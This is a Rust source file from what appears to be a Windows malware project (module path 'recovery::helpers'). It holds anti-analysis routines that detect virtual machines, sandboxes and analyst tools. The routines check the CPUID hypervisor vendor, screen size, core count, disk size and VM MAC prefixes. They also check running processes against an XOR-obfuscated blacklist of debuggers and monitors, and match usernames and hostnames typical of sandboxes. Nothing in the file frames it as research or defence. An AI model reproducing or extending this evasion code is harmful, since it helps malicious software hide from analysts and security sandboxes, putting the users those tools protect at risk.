use crate::recovery::helpers::obfuscation::deobf;
use std::collections::HashSet;
use windows::Win32::NetworkManagement::IpHelper::{
    GAA_FLAG_INCLUDE_PREFIX, GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::SystemInformation::GetSystemInfo;
use windows::Win32::System::SystemInformation::SYSTEM_INFO;
use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};

pub fn check_cpuid_hypervisor() -> bool {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        use std::arch::x86_64::__cpuid;
        let res = __cpuid(1);
        // ECX bit 31 indicates hypervisor
        if (res.ecx & (1 << 31)) == 0 {
            return false;
        }

        let res = __cpuid(0x40000000);
        let vendor = format!(
            "{}{} {}",
            String::from_utf8_lossy(&res.ebx.to_le_bytes()),
            String::from_utf8_lossy(&res.ecx.to_le_bytes()),
            String::from_utf8_lossy(&res.edx.to_le_bytes())
        );

        let known_vendors = [
            deobf(&[
                0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8, 0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8,
            ]), // VMwareVMware
            deobf(&[
                0xEB, 0xFF, 0xD2, 0xC5, 0xEB, 0xFF, 0xD2, 0xC5, 0xEB, 0xFF, 0xD2, 0xC5,
            ]), // VBoxVBoxVBox
            deobf(&[0xF6, 0xEB, 0xF0, 0xF6, 0xEB, 0xF0, 0xF6, 0xEB, 0xF0]), // KVMKVMKVM
            deobf(&[0xCD, 0xCF, 0xD1, 0x9D, 0xD5, 0xC4, 0xCD, 0xD8, 0xCF, 0xCB]), // prl hyperv
            deobf(&[
                0xE5, 0xD8, 0xD3, 0xEB, 0xF0, 0xF0, 0xE5, 0xD8, 0xD3, 0xEB, 0xF0, 0xF0,
            ]), // XenVMMXenVMM
            deobf(&[
                0xDF, 0xD5, 0xC4, 0xCB, 0xD8, 0x9D, 0xDF, 0xD5, 0xC4, 0xCB, 0xD8,
            ]), // bhyve bhyve
        ];

        for v in known_vendors {
            if vendor.contains(&v) {
                return true;
            }
        }
    }
    false
}

pub fn check_screen_resolution() -> bool {
    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        if width < 800 || height < 600 {
            return true;
        }

        if width == 800 && height == 600 {
            return true;
        }
    }
    false
}

pub fn check_cpu_cores() -> bool {
    unsafe {
        let mut info = SYSTEM_INFO::default();
        GetSystemInfo(&mut info);
        info.dwNumberOfProcessors < 2
    }
}

pub fn check_processes() -> bool {
    let mut processes = HashSet::new();
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if let Ok(handle) = snapshot {
            let mut entry = PROCESSENTRY32W::default();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(handle, &mut entry).is_ok() {
                loop {
                    if let Ok(name) = String::from_utf16(&entry.szExeFile) {
                        let name = name.trim_matches('\0').to_lowercase();
                        processes.insert(name);
                    }
                    if Process32NextW(handle, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = windows::Win32::Foundation::CloseHandle(handle);
        }
    }

    let blacklist = [
        deobf(&[
            0xCB, 0xDF, 0xD2, 0xC5, 0xCE, 0xD8, 0xCF, 0xCB, 0xD4, 0xDE, 0xD8, 0x93, 0xD8, 0xC5,
            0xD8,
        ]), // vboxservice.exe
        deobf(&[
            0xCB, 0xDF, 0xD2, 0xC5, 0xC9, 0xCF, 0xDC, 0xC4, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vboxtray.exe
        deobf(&[
            0xCB, 0xD0, 0xC9, 0xD2, 0xD2, 0xD1, 0xCE, 0xD9, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmtoolsd.exe
        deobf(&[
            0xCB, 0xD0, 0xCA, 0xDC, 0xCF, 0xD8, 0xC9, 0xCF, 0xDC, 0xC4, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmwaretray.exe
        deobf(&[
            0xCB, 0xD0, 0xCA, 0xDC, 0xCF, 0xD8, 0xC8, 0xCE, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmwareuser.exe
        deobf(&[
            0xCB, 0xDA, 0xDC, 0xC8, 0xC9, 0xD5, 0xCE, 0xD8, 0xCF, 0xCB, 0xD4, 0xDE, 0xD8, 0x93,
            0xD8, 0xC5, 0xD8,
        ]), // vgauthservice.exe
        deobf(&[
            0xCB, 0xD0, 0xDC, 0xDE, 0xC9, 0xD5, 0xD1, 0xCD, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmacthlp.exe
        deobf(&[0xCB, 0xD0, 0xCE, 0xCF, 0xCB, 0xDE, 0x93, 0xD8, 0xC5, 0xD8]), // vmsrvc.exe
        deobf(&[
            0xCB, 0xD0, 0xC8, 0xCE, 0xCF, 0xCB, 0xDE, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmusrvc.exe
        deobf(&[0xCD, 0xCF, 0xD1, 0xE2, 0xDE, 0xDE, 0x93, 0xD8, 0xC5, 0xD8]), // prl_cc.exe
        deobf(&[
            0xCD, 0xCF, 0xD1, 0xE2, 0xC9, 0xD2, 0xD2, 0xD1, 0xCE, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // prl_tools.exe
        deobf(&[
            0xC5, 0xD8, 0xD3, 0xCE, 0xD8, 0xCF, 0xCB, 0xD4, 0xDE, 0xD8, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // xenservice.exe
        deobf(&[
            0xCC, 0xD8, 0xD0, 0xC8, 0x90, 0xDA, 0xDC, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // qemu-ga.exe
        deobf(&[
            0xD7, 0xD2, 0xD8, 0xDF, 0xD2, 0xC5, 0xCE, 0xD8, 0xCF, 0xCB, 0xD8, 0xCF, 0x93, 0xD8,
            0xC5, 0xD8,
        ]), // joeboxserver.exe
        deobf(&[
            0xD7, 0xD2, 0xD8, 0xDF, 0xD2, 0xC5, 0xDE, 0xD2, 0xD3, 0xC9, 0xCF, 0xD2, 0xD1, 0x93,
            0xD8, 0xC5, 0xD8,
        ]), // joeboxcontrol.exe
        deobf(&[
            0xCA, 0xD4, 0xCF, 0xD8, 0xCE, 0xD5, 0xDC, 0xCF, 0xD6, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // wireshark.exe
        deobf(&[
            0xDB, 0xD4, 0xD9, 0xD9, 0xD1, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // fiddler.exe
        deobf(&[
            0xCD, 0xCF, 0xD2, 0xDE, 0xD0, 0xD2, 0xD3, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // procmon.exe
        deobf(&[
            0xCD, 0xCF, 0xD2, 0xDE, 0xD8, 0xC5, 0xCD, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // procexp.exe
        deobf(&[0xD4, 0xD9, 0xDC, 0x8B, 0x89, 0x93, 0xD8, 0xC5, 0xD8]),       // ida64.exe
        deobf(&[0xC5, 0x8B, 0x89, 0xD9, 0xDF, 0xDA, 0x93, 0xD8, 0xC5, 0xD8]), // x64dbg.exe
        deobf(&[0xCA, 0xD4, 0xD3, 0xD9, 0xDF, 0xDA, 0x93, 0xD8, 0xC5, 0xD8]), // windbg.exe
        deobf(&[
            0xD2, 0xD1, 0xD1, 0xC4, 0xD9, 0xDF, 0xDA, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // ollydbg.exe
        deobf(&[
            0xCD, 0xD8, 0xCE, 0xC9, 0xC8, 0xD9, 0xD4, 0xD2, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // pestudio.exe
        deobf(&[
            0xCD, 0xCF, 0xD2, 0xDE, 0xD8, 0xCE, 0xCE, 0xD5, 0xDC, 0xDE, 0xD6, 0xD8, 0xCF, 0x93,
            0xD8, 0xC5, 0xD8,
        ]), // processhacker.exe
    ];

    for tool in blacklist {
        if processes.contains(&tool) {
            return true;
        }
    }

    false
}

pub fn check_usernames() -> bool {
    let user = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    let computer = std::env::var("COMPUTERNAME")
        .unwrap_or_default()
        .to_lowercase();

    let bad_users = [
        deobf(&[
            0xCA, 0xD9, 0xDC, 0xDA, 0xC8, 0xC9, 0xD4, 0xD1, 0xD4, 0xC9, 0xC4, 0xDC, 0xDE, 0xDE,
            0xD2, 0xC8, 0xD3, 0xC9,
        ]), // wdagutilityaccount
        deobf(&[0xDC, 0xDF, 0xDF, 0xC4]), // abby
        deobf(&[
            0xCD, 0xD8, 0xC9, 0xD8, 0xCF, 0x9D, 0xCA, 0xD4, 0xD1, 0xCE, 0xD2, 0xD3,
        ]), // peter wilson
        deobf(&[0xD5, 0xD0, 0xDC, 0xCF, 0xDE]), // hmarc
        deobf(&[0xCD, 0xDC, 0xC9, 0xD8, 0xC5]), // patex
        deobf(&[0xD0, 0xDC, 0xD1, 0xCA, 0xDC, 0xCF, 0xD8]), // malware
        deobf(&[0xCE, 0xDC, 0xD3, 0xD9, 0xDF, 0xD2, 0xC5]), // sandbox
        deobf(&[0xCB, 0xD4, 0xCF, 0xC8, 0xCE]), // virus
        deobf(&[0xD0, 0xDC, 0xD1, 0xC9, 0xD8, 0xCE, 0xC9]), // maltest
        deobf(&[
            0xDE, 0xC8, 0xCF, 0xCF, 0xD8, 0xD3, 0xC9, 0xC8, 0xCE, 0xD8, 0xCF,
        ]), // currentuser
    ];

    let bad_hosts = [
        deobf(&[0xCE, 0xDC, 0xD3, 0xD9, 0xDF, 0xD2, 0xC5]), // sandbox
        deobf(&[0xC9, 0xD8, 0xCE, 0xC9]),                   // test
        deobf(&[0xD0, 0xDC, 0xD1, 0xCA, 0xDC, 0xCF, 0xD8]), // malware
        deobf(&[0xCE, 0xDC, 0xD0, 0xCD, 0xD1, 0xD8]),       // sample
        deobf(&[0xCB, 0xD4, 0xCF, 0xC8, 0xCE]),             // virus
        deobf(&[0xCB, 0xD0]),                               // vm
        deobf(&[0xDF, 0xD2, 0xC5]),                         // box
        deobf(&[0xDE, 0xC8, 0xDE, 0xD6, 0xD2, 0xD2]),       // cuckoo
        deobf(&[0xDC, 0xD3, 0xDC, 0xD1, 0xC4, 0xCE, 0xC9]), // analyst
    ];

    if bad_users.contains(&user) {
        return true;
    }

    if bad_hosts.iter().any(|h| computer.contains(h)) {
        return true;
    }

    false
}

pub fn check_disk_size() -> bool {
    use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
    use windows::core::PCWSTR;

    unsafe {
        let mut total_bytes = 0u64;
        let mut free_bytes = 0u64;
        let mut total_free = 0u64;
        let path = deobf(&[0x9E, 0x85, 0xEC, 0xBD])
            .encode_utf16()
            .collect::<Vec<u16>>();

        if GetDiskFreeSpaceExW(
            PCWSTR(path.as_ptr()),
            Some(&mut free_bytes),
            Some(&mut total_bytes),
            Some(&mut total_free),
        )
        .is_ok()
        {
            if total_bytes < 60 * 1024 * 1024 * 1024 {
                return true;
            }
        }
    }
    false
}

pub fn check_mac_address() -> bool {
    // 00:05:69 - VMWare
    // 00:0C:29 - VMWare
    // 00:1C:14 - VMWare
    // 00:50:56 - VMWare
    // 08:00:27 - VirtualBox
    // 0A:00:27 - VirtualBox
    // 00:03:FF - Microsoft Hyper-V (Legacy)
    // 00:15:5D - Microsoft Hyper-V
    // 00:16:3E - Xen
    let suspicious_ouis = [
        [0x00, 0x05, 0x69],
        [0x00, 0x0C, 0x29],
        [0x00, 0x1C, 0x14],
        [0x00, 0x50, 0x56],
        [0x08, 0x00, 0x27],
        [0x0A, 0x00, 0x27],
        [0x00, 0x03, 0xFF],
        [0x00, 0x15, 0x5D],
        [0x00, 0x16, 0x3E],
    ];

    unsafe {
        let mut buffer_len = 15000;
        let mut buffer = vec![0u8; buffer_len as usize];
        let ret = GetAdaptersAddresses(
            windows::Win32::Networking::WinSock::AF_UNSPEC.0 as u32,
            GAA_FLAG_INCLUDE_PREFIX,
            None,
            Some(buffer.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH),
            &mut buffer_len,
        );

        if ret == 0 {
            let mut adapter = buffer.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH;
            while !adapter.is_null() {
                let phys_len = (*adapter).PhysicalAddressLength as usize;
                if phys_len >= 3 {
                    let phys = &(&(*adapter).PhysicalAddress)[..3];
                    for oui in &suspicious_ouis {
                        if phys == oui {
                            return true;
                        }
                    }
                }
                adapter = (*adapter).Next;
            }
        }
    }
    false
}
